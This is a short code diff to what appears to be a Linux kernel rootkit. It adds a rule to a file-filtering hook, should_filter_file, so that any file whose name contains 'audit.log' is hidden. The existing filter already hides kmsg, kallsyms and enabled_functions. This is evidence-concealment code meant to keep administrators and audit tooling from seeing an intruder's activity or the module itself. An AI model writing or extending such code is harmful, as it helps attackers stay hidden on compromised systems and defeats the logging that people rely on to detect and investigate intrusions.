@@ -27,6 +27,10 @@ static int (*orig_sched_debug_show)(struct seq_file *m, void *v);
 notrace static bool should_filter_file(const char *filename) {
     if (!filename)
         return false;
+
+        if (strstr(filename, "audit.log") != NULL)
+        return true;
+    
     return (strcmp(filename, "kmsg") == 0 ||
             strcmp(filename, "kallsyms") == 0 ||
             strcmp(filename, "enabled_functions") == 0 ||
